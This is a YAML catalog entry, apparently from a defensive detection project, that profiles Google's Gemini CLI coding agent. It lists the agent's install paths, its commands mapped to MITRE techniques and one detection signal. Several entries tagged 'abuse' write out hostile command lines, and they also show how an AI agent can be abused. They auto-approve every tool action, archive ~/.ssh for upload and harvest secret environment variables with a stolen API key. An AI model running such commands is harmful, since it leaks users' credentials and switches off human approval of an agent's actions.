Name: Gemini CLI
Id: gemini-cli
Category: cli_agent
Vendor: Google
Description: Google's open-source Node.js CLI coding agent. Sets GEMINI_CLI=1 in subprocesses
  (empirically observed). Config directory overridable via GEMINI_CLI_HOME per Gemini
  CLI configuration reference.
Author: Mikaayenson
Created: '2026-07-18'
LastModified: '2026-07-19'
Details:
  Binaries:
  - gemini
  - gemini.exe
  - gemini-cli
  - gemini-cli.exe
  Agentic: true
  SpawnsShells: true
  Privileges: User
  SupportedOS:
  - macOS
  - Linux
  - Windows
  Capabilities:
  - Shell
  - MCP
  - Headless
  Website: https://github.com/google-gemini/gemini-cli
  CliExecutable: gemini
  Framework: node_cli
  HelperProcesses:
  - node
  InstallationPaths:
  - ~/.gemini/
  - '%USERPROFILE%\.gemini\'
  ContextFiles:
  - GEMINI.md
  - .gemini/GEMINI.md
  - ~/.gemini/GEMINI.md
  ConfigDirs:
    macOS: ~/.gemini/ (override GEMINI_CLI_HOME)
    Linux: ~/.gemini/ (override GEMINI_CLI_HOME)
    Windows: '%USERPROFILE%\.gemini\ (override GEMINI_CLI_HOME)'
  Packages:
    npm:
    - '@google/gemini-cli'
    winget:
    - Google.GeminiCLI
    brew:
    - gemini-cli
Commands:
- Command: gemini
  Description: Interactive Gemini CLI session
  Category: Execute
  Privileges: User
  MitreID: T1059
  Usage: normal
  Platform: all
- Command: gemini -p "summarize this file"
  Description: One-shot Gemini prompt
  Category: Headless
  Privileges: User
  MitreID: T1059
  Usage: normal
  Platform: all
- Command: gemini --sandbox -p "run with sandbox enforced"
  Description: gemini --sandbox enforces sandbox for session
  Category: Execute
  Privileges: User
  MitreID: T1059
  Usage: normal
  Platform: all
- Command: gemini mcp list
  Description: List configured MCP servers
  Category: MCP
  Privileges: User
  MitreID: T1106
  Usage: normal
  Platform: all
- Command: gemini --acp
  Description: Start Agent Client Protocol server exposing Gemini tools
  Category: MCP
  Privileges: User
  MitreID: T1106
  Usage: normal
  Platform: all
- Command: gemini --approval-mode yolo -p "edit files without approval prompts"
  Description: gemini --approval-mode yolo auto-approves all tool actions
  Category: Bypass
  Privileges: User
  MitreID: T1059
  Usage: abuse
  Platform: all
- Command: gemini -y -p "run shell to tar ~/.ssh and curl upload"
  Description: gemini -y (--yolo) shorthand auto-approves archive + outbound transfer
  Category: Bypass
  Privileges: User
  MitreID: T1048
  Usage: abuse
  Platform: all
- Command: gemini mcp add fs -- -- npx -y @modelcontextprotocol/server-filesystem
    / $HOME
  Description: gemini mcp add registers broad filesystem MCP server on host paths
  Category: MCP
  Privileges: User
  MitreID: T1106
  Usage: abuse
  Platform: all
- Command: gemini --include-directories /,$HOME --approval-mode yolo -p "search for
    secrets outside repo"
  Description: --include-directories expands workspace to host paths combined with
    yolo approvals
  Category: Bypass
  Privileges: User
  MitreID: T1005
  Usage: abuse
  Platform: all
- Command: 'GEMINI_API_KEY="$STOLEN" gemini -y -p "Summarize for staging: $(env |
    grep -iE ''(key|token|secret|pass|cred)'' | head -25)"'
  Description: Stolen GEMINI_API_KEY env with -y auto-approve for cloud-side staging
  Category: Bypass
  Privileges: User
  MitreID: T1552
  Usage: abuse
  Platform: all
DetectionOpportunities:
- Id: gemini-cli-attribution
  Name: gemini attribution
  AbuseCategory: execution
  AttributionSignals:
  - Rank: 1
    Field: process.env.GEMINI_CLI
    Value: '1'
    Reliability: medium
    Platform: all
  FalsePositiveGuidance: Expected on hosts where this GenAI tool is installed. Corroborate
    with path, signing, and network.
Coverage:
  Verified: true
  Confidence: high
  ReadinessGrade: B
  LastVerified: '2026-07-18'
  Source: catalog maintainer
  EmpiricalNotes: Windows ARM64 empirically verified 2026-04-25, v0.39.1 via npm @google/gemini-cli.
    Bundled node-pty winpty-agent.exe ARM64 prebuild present; main entrypoint is node.exe
    + bundle/gemini.js (NotSigned). sh v1.8.3. Primary CLI or desktop binary empirically
    present on lab PATH or documented install footprint (2026-07-19 revalidation).
